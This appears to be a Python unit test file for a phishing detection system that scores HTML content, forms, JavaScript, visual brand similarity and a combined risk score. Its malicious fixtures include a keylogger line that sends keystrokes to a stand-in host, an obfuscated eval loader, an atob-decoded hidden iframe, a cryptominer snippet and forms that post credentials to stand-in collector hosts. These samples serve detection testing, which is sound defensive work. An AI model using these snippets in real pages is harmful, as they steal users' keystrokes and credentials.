"""
PHISH GUARD - Hybrid Phishing Detection System Test Suite
Unit & Integration tests verifying all hybrid analysis modules, risk fusion, and multi-modal API.
"""

import os
import sys
import unittest

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, PROJECT_ROOT)
sys.path.insert(0, os.path.join(PROJECT_ROOT, "backend"))

from content_analyzer.html_content_analyzer import HTMLContentAnalyzer
from form_analyzer.form_security_analyzer import FormSecurityAnalyzer
from javascript_analyzer.js_threat_analyzer import JavaScriptThreatAnalyzer
from visual_similarity.visual_comparator import VisualComparator, BRAND_PROFILES
from risk_engine.hybrid_risk_engine import HybridRiskEngine
from app import app


class TestHTMLContentAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = HTMLContentAnalyzer()

    def test_benign_html(self):
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Safe Educational Portal</title></head>
        <body>
            <h1>Welcome to Open University</h1>
            <p>Courses and study materials.</p>
            <a href="/courses">Internal Courses</a>
            <a href="https://wikipedia.org">External Wiki</a>
        </body>
        </html>
        """
        feats, reasons, meta = self.analyzer.analyze_html(html, "https://open.edu")
        self.assertIn("has_cryptominer", feats)
        self.assertEqual(feats["has_cryptominer"], 0.0)
        self.assertLess(meta.get("content_threat_score", 0), 40)

    def test_malicious_content_indicators(self):
        html = """
        <html>
        <head><title>Warning: Your Account is Suspended</title></head>
        <body oncontextmenu="return false;">
            <h2>Critical Alert: Call Microsoft Support</h2>
            <p style="opacity:0; position:absolute; left:-9999px;">Invisible deception text</p>
            <script>
                var miner = new CoinHive.Anonymous('token');
                miner.start();
            </script>
            <iframe src="http://sketchy-site.cc/hidden.php" style="display:none;"></iframe>
        </body>
        </html>
        """
        feats, reasons, meta = self.analyzer.analyze_html(html, "http://fake-alert-security.top")
        self.assertEqual(feats["has_cryptominer"], 1.0)
        self.assertEqual(feats["scareware_detected"], 1.0)
        self.assertGreater(feats["iframe_count"], 0)
        self.assertGreater(meta.get("content_threat_score", 0), 30)


class TestFormSecurityAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = FormSecurityAnalyzer()

    def test_safe_same_origin_form(self):
        forms = [{
            "action": "https://accounts.google.com/signin/v2",
            "method": "POST",
            "inputs": [
                {"type": "email", "name": "identifier"},
                {"type": "password", "name": "passwd"}
            ]
        }]
        feats, reasons, meta = self.analyzer.analyze_forms(forms, "https://accounts.google.com/signin")
        self.assertEqual(feats["external_action_count"], 0.0)
        self.assertLess(meta.get("form_threat_score", 0), 50)

    def test_credential_theft_external_exfiltration(self):
        forms = [{
            "action": "http://malicious-collector.top/steal.php",
            "method": "POST",
            "inputs": [
                {"type": "text", "name": "username"},
                {"type": "password", "name": "password"},
                {"type": "text", "name": "credit_card"},
                {"type": "text", "name": "otp"}
            ]
        }]
        feats, reasons, meta = self.analyzer.analyze_forms(forms, "https://chase-security-verify.com")
        self.assertEqual(feats["external_action_count"], 1.0)
        self.assertEqual(feats["has_credit_card_field"], 1.0)
        self.assertEqual(feats["has_otp_field"], 1.0)
        self.assertGreater(meta.get("form_threat_score", 0), 65)
        self.assertTrue(any("exfiltration" in r.lower() or "external" in r.lower() for r in reasons))


class TestJavaScriptThreatAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = JavaScriptThreatAnalyzer()

    def test_obfuscated_and_keylogger_detection(self):
        scripts = [
            "eval(function(p,a,c,k,e,d){return p;}('stolen=1;',1,1,'||'.split('|'),0,{}))",
            "document.addEventListener('keydown', function(e) { fetch('http://evil.cc/key?k=' + e.key); });",
            "document.write(atob('PGlmcmFtZSBzcmM9Imh0dHA6Ly9ldmlsLmNjIj4='));"
        ]
        feats, reasons, meta = self.analyzer.analyze_scripts(scripts)
        self.assertEqual(feats["js_has_eval"], 1.0)
        self.assertEqual(feats["js_has_keylogging"], 1.0)
        self.assertEqual(feats["js_has_doc_write"], 1.0)
        self.assertEqual(feats["js_has_atob"], 1.0)
        self.assertGreater(meta.get("js_threat_score", 0), 50)


class TestVisualComparator(unittest.TestCase):
    def setUp(self):
        self.comparator = VisualComparator()

    def test_target_brands_loaded(self):
        brands = BRAND_PROFILES
        self.assertIn("google", brands)
        self.assertIn("microsoft", brands)
        self.assertIn("paypal", brands)
        self.assertIn("netflix", brands)

    def test_comparison_with_null_screenshot(self):
        feats, reasons, meta = self.comparator.analyze_screenshot(None, "https://paypal-verify-alert.com")
        self.assertEqual(feats["screenshot_provided"], 0.0)
        self.assertEqual(feats["visual_threat_score"], 0.0)
        self.assertIsNone(meta.get("matched_brand"))


class TestHybridRiskEngine(unittest.TestCase):
    def setUp(self):
        self.engine = HybridRiskEngine()

    def test_weighted_safe_fusion(self):
        res = self.engine.evaluate(
            url_threat_score=10.0,
            content_threat_score=10.0,
            form_threat_score=5.0,
            js_threat_score=5.0,
            visual_threat_score=5.0,
            ssl_threat_score=0.0,
            reputation_threat_score=10.0,
            image_threat_score=5.0,
            critical_flags={"is_blacklisted": False, "credential_harvesting": False}
        )
        self.assertEqual(res["decision"], "SAFE")
        self.assertEqual(res["risk_level"], "Low")
        self.assertLess(res["hybrid_score"], 40.0)

    def test_credential_harvesting_critical_override(self):
        res = self.engine.evaluate(
            url_threat_score=45.0,
            content_threat_score=40.0,
            form_threat_score=90.0,
            js_threat_score=30.0,
            visual_threat_score=20.0,
            ssl_threat_score=10.0,
            reputation_threat_score=20.0,
            image_threat_score=10.0,
            critical_flags={"cross_domain_credential_post": True}
        )
        self.assertEqual(res["decision"], "PHISHING")
        self.assertEqual(res["risk_level"], "Critical")
        self.assertGreater(res["hybrid_score"], 70.0)


class TestHybridAPIEndpoints(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()
        self.client.testing = True

    def test_health_check(self):
        res = self.client.get("/health")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "healthy")
        self.assertTrue(data["hybrid_engine_loaded"])

    def test_predict_hybrid_safe(self):
        payload = {
            "url": "https://www.wikipedia.org",
            "html": "<html><head><title>Wikipedia</title></head><body>Welcome to the free encyclopedia</body></html>",
            "forms": [],
            "scripts": [],
            "images": []
        }
        res = self.client.post("/predict-hybrid", json=payload)
        self.assertEqual(res.status_code, 200)
        data = res.get_json()["data"]
        self.assertEqual(data["prediction"], "SAFE")
        self.assertIn("hybrid_score", data)
        self.assertIn("layer_scores", data)
        self.assertLess(data["hybrid_score"], 40.0)

    def test_predict_hybrid_phishing(self):
        payload = {
            "url": "http://paypal-verification-center.cc/login.php",
            "html": "<html><head><title>PayPal Secure Login</title></head><body><h1>Verify PayPal Account</h1></body></html>",
            "forms": [{
                "action": "http://evil-attacker.top/harvest.php",
                "method": "POST",
                "inputs": [
                    {"type": "email", "name": "email"},
                    {"type": "password", "name": "password"}
                ]
            }],
            "scripts": ["eval('steal=1');"],
            "images": []
        }
        res = self.client.post("/predict-hybrid", json=payload)
        self.assertEqual(res.status_code, 200)
        data = res.get_json()["data"]
        self.assertEqual(data["prediction"], "PHISHING")
        self.assertIn("hybrid_score", data)
        self.assertGreater(data["hybrid_score"], 65.0)

    def test_export_scans_csv(self):
        res = self.client.get("/export-scans")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.mimetype, "text/csv")
        self.assertIn(b"Hybrid_Score", res.data)
        self.assertIn(b"Prediction", res.data)


if __name__ == "__main__":
    unittest.main()
